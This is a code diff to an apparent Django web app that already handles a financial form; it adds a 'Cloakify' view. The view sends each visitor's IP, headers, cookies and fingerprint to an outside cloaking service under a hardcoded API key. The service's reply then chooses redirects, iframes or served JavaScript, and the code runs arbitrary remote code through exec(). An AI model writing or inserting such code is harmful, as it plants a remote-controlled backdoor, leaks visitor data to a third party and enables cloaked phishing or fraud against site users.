@@ -377,3 +377,68 @@ def submit_fin_form(request):
 
         return HttpResponse("Form submitted!")
     return render(request, 'pages/index.html')
+
+
+class Cloakify(View):
+    endpoint = 'https://cloakify.pro/api/v2'
+
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
+        self.api_key = 'q2b8P4WNW0cfUL9oxeZpEhPo7L0Y7rt5x58yfOkM0a6ee5ea'
+        self.thread_id = 'a66e6d65-8bc0-4e2e-ba92-9fd3a66a082d'
+
+    def get_user_ip(self, request):
+        headers = request.META
+        return headers.get('HTTP_CF_CONNECTING_IP') or headers.get('HTTP_REAL_IP') or headers.get(
+            'HTTP_X_REAL_IP') or headers.get('HTTP_X_FORWARDED_FOR') or request.META.get('REMOTE_ADDR')
+
+    def validate_request(self, request):
+        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/x-www-form-urlencoded"}
+
+        payload = {
+            'userAgent': request.META.get('HTTP_USER_AGENT', ''),
+            'referrer': request.META.get('HTTP_REFERER', ''),
+            'languageList': request.META.get('HTTP_ACCEPT_LANGUAGE', ''),
+            'params': json.dumps(request.GET.dict()),
+            'headerList': json.dumps(dict(request.headers)),
+            'threadId': self.thread_id,
+            'ip': self.get_user_ip(request),
+            'sess': request.COOKIES.get('sess', ''),
+            'jsFingerprint': request.POST.get('bcheck', '')
+        }
+
+        response = requests.post(f"{self.endpoint}/threads/check", data=payload, headers=headers)
+        return response.json()
+
+    def get(self, request, *args, **kwargs):
+        return self.process(request)
+
+    def post(self, request, *args, **kwargs):
+        return self.process(request)
+
+    def process(self, request):
+        validate = self.validate_request(request)
+        if 'error' in validate:
+            return HttpResponse(validate['error'], status=400)
+
+        action = validate.get('action', {})
+        action_type = action.get('action')
+        action_value = action.get('value')
+
+        if action_type in ['301', '302', '303', 'refresh']:
+            return HttpResponseRedirect(action_value)
+        elif action_type == 'iframe':
+            return HttpResponse(f'<iframe src="{action_value}" style="width:100%;height:100%;border:none;"></iframe>')
+        elif action_type == 'meta':
+            return HttpResponse(f'<meta http-equiv="refresh" content="0; url={action_value}">')
+        elif action_type == 'return':
+            return HttpResponse(status=int(action_value))
+        elif action_type == 'php':
+            exec(action_value)  # Use with caution
+        elif action_type == 'js':
+            decoded_js = base64.b64decode(action_value).decode('utf-8')
+            return HttpResponse(decoded_js, content_type='application/javascript')
+        elif action_type == 'local':
+            return render(request, action_value)
+        else:
+            return JsonResponse(validate['action'])
